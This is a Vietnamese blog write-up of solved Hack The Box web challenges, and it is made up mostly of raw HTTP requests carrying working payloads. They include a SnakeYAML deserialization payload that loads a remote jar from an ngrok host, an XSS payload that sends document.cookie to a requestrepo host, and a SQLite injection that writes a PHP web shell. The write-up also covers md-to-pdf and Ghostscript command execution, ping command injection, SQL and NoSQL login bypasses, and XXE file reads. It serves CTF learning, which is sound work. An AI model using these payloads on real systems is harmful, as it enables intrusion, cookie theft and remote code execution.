---
title: "Htb web chall ctf 2024 - solved challenges - part 3"
excerpt: "August 22, 2024 08:00 AM ICT to August 22, 2024 04:00 PM ICT"
header:
show_date: true
header:
  teaser: "../assets/images/images-icon/htb.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/htb.jpg">
</p>

# Hack the box

## Watersnake

![image](https://hackmd.io/_uploads/H1NMp5fuR.png)


```
POST /update HTTP/1.1
Host: 83.136.255.222:50084
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://83.136.255.222:50084/update.html
Content-Type: multipart/form-data; boundary=---------------------------56413677111823040781259599420
Content-Length: 322
Origin: http://83.136.255.222:50084
Connection: close
Priority: u=0

-----------------------------56413677111823040781259599420
Content-Disposition: form-data; name="config"

!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://0.tcp.ap.ngrok.io:11632/yaml-payload.jar"]
  ]]
]
-----------------------------56413677111823040781259599420--

```

![image](https://hackmd.io/_uploads/rkHoTqG_C.png)

![image](https://hackmd.io/_uploads/B1QhacMdR.png)

flag: `HTB{sn4k3_y4ml_d3s3r14lized_ftw!}`

link: https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/
poc: https://github.com/artsploit/yaml-payload/tree/master

## Lazy Ballot Couch [No sqli]

```
 async loginUser(username, password) {
        const options = {
            selector: {
                username: username,
                password: password,
            },
        };

        const resp = await this.userdb.find(options);
        if (resp.docs.length) return true;

        return false;
    }
```

```
POST /api/login HTTP/1.1
Host: 94.237.59.199:46446
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.59.199:46446/login
Content-Type: application/json
Content-Length: 59
Origin: http://94.237.59.199:46446
Connection: close
Cookie: connect.sid=s%3AFEy85rDbjlaB98jjRZg_434QpKF04wbu.YsZ6wi1WZit6HUvxSeo92fkdBT2KekP8X80%2FbprxZYA
Priority: u=0

{"username":{
"$ne": null
},"password":{
"$ne": null
}}
```

![image](https://hackmd.io/_uploads/ryi5fsfu0.png)


![image](https://hackmd.io/_uploads/Sy5jzjM_0.png)

flag : `HTB{c0rrupt3d_c0uch_b4ll0ts!}`

## Neonify

![image](https://hackmd.io/_uploads/ryg5Zfu_R.png)


![image](https://hackmd.io/_uploads/SJPTbG_OC.png)

```
POST / HTTP/1.1
Host: 94.237.53.113:50183
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://94.237.53.113:50183
Connection: close
Referer: http://94.237.53.113:50183/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

neon=1111%0a<%25%3d+7*7+%25>
```


```
POST / HTTP/1.1
Host: 94.237.53.113:50183
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://94.237.53.113:50183
Connection: close
Referer: http://94.237.53.113:50183/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

neon=1111%0a<%25%3d+`ls+/`+%25>
```


![image](https://hackmd.io/_uploads/BkpzMG__C.png)


![image](https://hackmd.io/_uploads/HkeSzGOdC.png)

```
POST / HTTP/1.1
Host: 94.237.53.113:50183
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://94.237.53.113:50183
Connection: close
Referer: http://94.237.53.113:50183/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

neon=1111%0a<%25%3d+`cat%20flag.txt`+%25>
```

flag: `HTB{r3pl4c3m3n7_s3cur1ty}`


## Kryptos Support

```

POST /api/tickets/add HTTP/1.1
Host: 94.237.58.3:54574
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.58.3:54574/
Content-Type: application/json
Content-Length: 91
Origin: http://94.237.58.3:54574
Connection: close
Priority: u=0

{"message":"<script>fetch('http://luhlr27z.requestrepo.com?a='+document.cookie);</script>"}
```


![image](https://hackmd.io/_uploads/rkDeuXO_R.png)
![image](https://hackmd.io/_uploads/SkCP_XuuR.png)

![image](https://hackmd.io/_uploads/S1XzYmdO0.png)


![image](https://hackmd.io/_uploads/HyzVYm_OA.png)

flag: `HTB{p0pp1ng_x55_4nd_id0rs_ftw!}`


## Intergalactic Post

- Một chall với php và sqlite


### analysis


```
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});


$database = new Database('/tmp/challenge.db');

$router = new Router();
$router->new('GET', '/', 'IndexController@index');
$router->new('POST', '/subscribe', 'SubsController@store');

die($router->match());
```

Như ta có thể thấy thì chall này có 2 api chính đó là GET / sẽ hiển thị trang chính index và POST /sybscribe sẽ gọi đến store trong SubsController



```
<?php
class SubscriberModel extends Model
{

    public function __construct()
    {
        parent::__construct();
    }

    public function getSubscriberIP(){
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        return '';
    }

    public function subscribe($email)
    {
        $ip_address = $this->getSubscriberIP();
        return $this->database->subscribeUser($ip_address, $email);
    }
}

```


ở đây được khởi tạo một class với method getSubscriberIP sẽ lấy địa chỉ IP qua `X-Forwarded-For` hoặc địa chỉ ip thật của người dùng nếu không tồn tại header này.

Thêm một method nữa là subscribe sẽ nhận đối số là email sau đó khởi tại ip_address bằng việc gọi method `getSubscriberIP` sau đó gọi đến method `subscribeUser($ip_address, $email)`

```
public function subscribeUser($ip_address, $email)
    {
        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
    }
```


Có thể thấy ở đây có thể bị sqli bằng việc cộng chuỗi, nhưng để ý vị trí của flag


```
# Copy flag
RUN RND=$(echo $RANDOM | md5sum | head -c 15) && \
	echo "HTB{f4k3_fl4g_f0r_t3st1ng}" > /flag_${RND}.txt
```

Vị trí của flag nằm ở /root cho nên mục tiêu của ta là RCE -> may thay vẫn có payload stack query của sqlite

Nguồn payload : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database


### Exploit local server + real server

Bởi vì docker build dùng bản php7 lỗi nên không test local được nên ta exploit server luôn
```
POST /subscribe HTTP/1.1
Host: 83.136.249.33:39389
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
X-Forwarded-For: lmaolmao','lmao@gmail.com');ATTACH DATABASE '/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");-- 
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=lmao%40gmail.com
```

![image](https://hackmd.io/_uploads/BkxveS29C.png)


flag: `HTB{inj3ct3d_th3_in3vit4bl3_tru7h}`


Note : Ngoài ra ta có thể bypass `if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            header('Location: /?success=false&msg=Please submit a valild email address!');
            exit;
        }` để thực hiện SQLI cơ bản theo bài

https://github.com/Xib3rR4dAr/filter-var-sqli


## BlinkerFluids

Một chall với nodejs + sqlite database + md-to-pdf để convert file markdown thành file pdf


### analysis + detect


Server chính có có 1 route nằm trong thư mục route làm nhieenmj vị chính của chương trình


```

// index.js
const express      = require('express');
const app          = express();
const path         = require('path');
const nunjucks     = require('nunjucks');
const routes       = require('./routes/index.js');
const Database     = require('./database');

const db = new Database('invoice.db');

app.use(express.json());
app.disable('etag');

nunjucks.configure('views', {
	autoescape: true,
	express: app
});

app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes(db));

app.all('*', (req, res) => {
	return res.status(404).send({
		message: '404 page not found'
	});
});

(async () => {
	await db.connect();
	await db.migrate();
	app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
})();
```

```
 //routes/index.js
 
 
const express        = require('express');
const router         = express.Router();
const MDHelper       = require('../helpers/MDHelper.js');

let db;

const response = data => ({ message: data });

router.get('/', async (req, res) => {
    return res.render('index.html');
});

router.get('/api/invoice/list', async (req, res) => {
	return db.listInvoices()
		.then(invoices => {
			res.json(invoices);
		})
		.catch(e => {
			res.status(500).send(response('Something went wrong!'));
		})
});

router.post('/api/invoice/add', async (req, res) => {
    const { markdown_content } = req.body;

    if (markdown_content) {
        return MDHelper.makePDF(markdown_content)
            .then(id => {
                db.addInvoice(id)
					.then(() => {
						res.send(response('Invoice saved successfully!'));
					})
					.catch(e => {
						res.send(response('Something went wrong!'));
					})
            })
            .catch(e => {
                console.log(e);
                return res.status(500).send(response('Something went wrong!'));
            })
    }
    return res.status(401).send(response('Missing required parameters!'));
});

router.post('/api/invoice/delete', async (req, res) => {
	const { invoice_id } = req.body;

	if (invoice_id) {
		return db.deleteInvoice(invoice_id)
		.then(() => {
			res.send(response('Invoice removed successfully!'))
		})
		.catch(e => {
			res.status(500).send(response('Something went wrong!'));
		})
	}

	return res.status(401).send(response('Missing required parameters!'));
});

module.exports = database => {
    db = database;
    return router;
};


```

ở đây để ý có tổng cộng 4 api được cài đặt và export ra chương trình chính


```

router.get('/api/invoice/list', async (req, res) => {
	return db.listInvoices()
		.then(invoices => {
			res.json(invoices);
		})
		.catch(e => {
			res.status(500).send(response('Something went wrong!'));
		})
});

```

api này đơn giản chỉ hiển thị các thông tin trong db `let stmt = await this.db.prepare('SELECT * FROM invoices order by id desc');`


```
router.post('/api/invoice/delete', async (req, res) => {
	const { invoice_id } = req.body;

	if (invoice_id) {
		return db.deleteInvoice(invoice_id)
		.then(() => {
			res.send(response('Invoice removed successfully!'))
		})
		.catch(e => {
			res.status(500).send(response('Something went wrong!'));
		})
	}

	return res.status(401).send(response('Missing required parameters!'));
});

```

api này thì để xóa của cái trên


Để ý có một api duy nhất có xử lý nhiều ở đây đó là:


```
router.post('/api/invoice/add', async (req, res) => {
    const { markdown_content } = req.body;

    if (markdown_content) {
        return MDHelper.makePDF(markdown_content)
            .then(id => {
                db.addInvoice(id)
					.then(() => {
						res.send(response('Invoice saved successfully!'));
					})
					.catch(e => {
						res.send(response('Something went wrong!'));
					})
            })
            .catch(e => {
                console.log(e);
                return res.status(500).send(response('Something went wrong!'));
            })
    }
    return res.status(401).send(response('Missing required parameters!'));
});
```

Nó sẽ nhận một tham số là `markdown_content` tức là nội dung markdown ta muôn add sau đó nó gọi đến helper:

```
const { mdToPdf }    = require('md-to-pdf')
const { v4: uuidv4 } = require('uuid')

const makePDF = async (markdown) => {
    return new Promise(async (resolve, reject) => {
        id = uuidv4();
        try {
            await mdToPdf(
                { content: markdown },
                {
                    dest: `static/invoices/${id}.pdf`,
                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 
                }
            );
            resolve(id);
        } catch (e) {
            reject(e);
        }
    });
}

module.exports = {
    makePDF
};
```

ở đây ta để ý nó sử dụng module `mdToPdf` của thư viện `md-to-pdf` có version là `"md-to-pdf": "4.1.0"` ní thực hiện convert file markdown sang pdf sau đó lưu lại ở static cuỗi cùng sẽ lưu id vào trong db.


### Remote Code Execution (RCE) in `md-to-pdf version 4.1.0`

Khá dễ để tìm kiếm là nó dính rce ở phiên bản này:

poc:  

![image](https://hackmd.io/_uploads/rkI_LBhcC.png)



### exploit

```
# Add flag
COPY flag.txt /flag.txt

```

flag nằm ở root nên chỉ cần cat và gửi ra ngoài ở đây mình cp ra static luôn

![image](https://hackmd.io/_uploads/H1yHdBn90.png)


```
POST /api/invoice/add HTTP/1.1
Host: 94.237.49.212:37990
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:37990/
Content-Type: application/json
Content-Length: 116
Origin: http://94.237.49.212:37990
Connection: close
Priority: u=0

{"markdown_content":"---js\n((require(\"child_process\")).execSync(\"cp /flag.txt static/invoices/flag\"))\n---RCE"}
```

flag: `HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}`



## EasterBunny



## petpet rcbee


```
POST /api/upload HTTP/1.1
Host: 94.237.59.63:54125
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------31309964863637461648537953000
Content-Length: 487
Origin: http://94.237.59.63:54125
Connection: close
Referer: http://94.237.59.63:54125/
Priority: u=0

-----------------------------31309964863637461648537953000
Content-Disposition: form-data; name="file"; filename="ccc.jpg"
Content-Type: image/jpeg

%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat /app/flag > /app/application/static/css/aaa) currentdevice putdeviceprops

-----------------------------31309964863637461648537953000--

```


![image](https://hackmd.io/_uploads/rJmUl-OaC.png)

flag: `HTB{c0mfy_bzzzzz_rcb33s_v1b3s}`



## baby CachedView


![image](https://hackmd.io/_uploads/r1RA1MupC.png)


flag: ![image](https://hackmd.io/_uploads/SyvkxMuTC.png)

link: https://lock.cmpxchg8b.com/rebinder.html


## looking glass

![image](https://hackmd.io/_uploads/ByCgvfdpA.png)

```
POST / HTTP/1.1
Host: 94.237.50.249:46774
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://94.237.50.249:46774
Connection: close
Referer: http://94.237.50.249:46774/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

test=ping&ip_address=8.8.8.8|cat+/flag_KwPxu&submit=Test
```

![image](https://hackmd.io/_uploads/rJi-wMdpA.png)


flag: `HTB{I_f1n4lly_l00k3d_thr0ugh_th3_rc3}`

## sanitize

![image](https://hackmd.io/_uploads/BkO3vG_pC.png)


```
POST / HTTP/1.1
Host: 94.237.49.212:45829
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://94.237.49.212:45829
Connection: close
Referer: http://94.237.49.212:45829/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin'+or+1=1--'&password=a
```

![image](https://hackmd.io/_uploads/r1lThPGupC.png)

flag: `HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}`



## baby auth

![image](https://hackmd.io/_uploads/By6BFfdpC.png)


```
GET / HTTP/1.1
Host: 94.237.49.212:35182
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:35182/login
Connection: close
Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0%3d
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

flag: `HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}`


## baby nginxatsu

![image](https://hackmd.io/_uploads/BJRI0fYa0.png)

![image](https://hackmd.io/_uploads/r1dP0GY60.png)

```
POST /auth/login HTTP/1.1
Host: 94.237.59.63:36223
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: http://94.237.59.63:36223
Connection: close
Referer: http://94.237.59.63:36223/auth/login
Cookie: XSRF-TOKEN=eyJpdiI6IkxjSzVBUXBQRXJXRHZNaWNCRUJRdkE9PSIsInZhbHVlIjoiSUFCT1kreVZTcXV1RXJ1ZlJvQzJUUzBmSjJLVVd4Y25QZUlqUDJnaVc1eUJjb3ZNZFNoLzBzY1ovVjlZekNFWFF3cG1RRHRtSG5RNlo5MG05UkxIU2ROUVJsaWRyZ1Nla2dIeGJodnlNNUZQMk1iclZJbEMrMmpRVm5xb091U0IiLCJtYWMiOiJkZGJkODFmMjhmNzI4NzZlZjJjNmYyMjJkNTQwOWQ0ZmRkOWNmNDFhNzNiNmJlZGFiZjViYTc0NzIxMjFhMTc0In0%3D; laravel_session=eyJpdiI6IlFTZGF0eWdRS0E3MzVvSjdqeUkrbGc9PSIsInZhbHVlIjoiZHcvcDVZUm5NVS9ScDVmL3ZyVUowVlVmTzhNQ0lBekcwTGM4QUNYQzQ1dTVmUHZMT0VoVXFhZTdlc0xTdjZIUWlWUThyYmhlOUJ5NEtMV3h3WE1VZFlvb1hLeHFVRlZIVjE1eGFxSkhCc1RvdUZMQ2dkUGN4MERNanNVMVQ0NDYiLCJtYWMiOiJhZjRmNDE0ZTUzOWFjMjA2ODRmNThjNjJlZmZkYzBiMTkwYTk5MTM5ZDMzMTk4MDIxNGJmMjFjOGNkZmRmZTk3In0%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i

_token=odnes8Qm3lep4n0E6nxN0zOlz0GBgS4tz6SQfxvY&email=nginxatsu-adm-01%40makelarid.es&password=adminadmin1
```

![image](https://hackmd.io/_uploads/SJYS0GtT0.png)

flag: `HTB{ng1ngx_r34lly_b3_sp1ll1ng_my_w3ll_h1dd3n_s3cr3ts??}`


## baby WAFfles order

Ta có thể thấy là đối với trang web này sẽ có một form để chúng ta order sau đó thì hiển thị nội dung là food đã được order thành công -> ban đầu hướng đến các loại là ssti và xxe -> sau khi fuzz không có ssti của php thì ta chuyển qua xxe -> thử chuyển dạng data json thành xml và thành công -> dùng xxe để hiển thị nội dung flag bằng system:

```
POST /api/order HTTP/1.1
Host: 83.136.255.40:44465
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://83.136.255.40:44465/
Content-Type: application/xml
Content-Length: 172
Origin: http://83.136.255.40:44465
Connection: close
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
<order>
    <table_num>100</table_num>
    <food>
    
</order>
```

![image](https://hackmd.io/_uploads/ByyrrXYaA.png)


flag: `HTB{wh0_l3t_th3_XX3_0ut??w00f..w00f..w00f..WAFfles!}`


## baby todo or not todo

Vị trí của flag:

![image](https://hackmd.io/_uploads/Syg4QLK60.png)

nằm trong bảng todos là một note todo do admin ghi.

Ta có thể thấy một api chưa được sử dụng đó là /list/all/?secret=....

Nó chỉ yêu cầu secret và trả ra tất cả các row trong bảng todos


```
@classmethod
	def get_all(cls):
		cls.todo = []
		for task in query_db('SELECT * FROM todos'):
			cls.todo.append(todo(task['id'], task['name'], task['assignee'], bool(task['done'])))
		return cls.todo

```

```
GET /api/list/all/?secret=a23A0eedFe270Aa HTTP/1.1
Host: 94.237.59.63:40388
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.59.63:40388/
Connection: close
Cookie: session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXIxMTRFRmRBQiJ9.ZuvSWQ.zs6OZFlJ0sxu1ptUTZlAhR7xs6M
Priority: u=4
```

![image](https://hackmd.io/_uploads/rJ2jMIYTR.png)

flag: `HTB{l3ss_ch0r3s_m0r3_h4ck1ng...right?!!1}`


## baby BoneChewerCon

Lỗi ở đây là do lavarel framwork không hỗ trợ method POST nên khi ta sử dụng nó sẽ hiện thị với debugger và flag nằm trong đó.


![image](https://hackmd.io/_uploads/BJFi7Lta0.png)


flag: `HTB{wh3n_th3_d3bugg3r_turns_4g41nst_th3_d3bugg33}`

## Full Stack Conf

![image](https://hackmd.io/_uploads/B1mxFLYpC.png)

flag: `HTB{p0p..p0p..p0p...alert(1337)}`
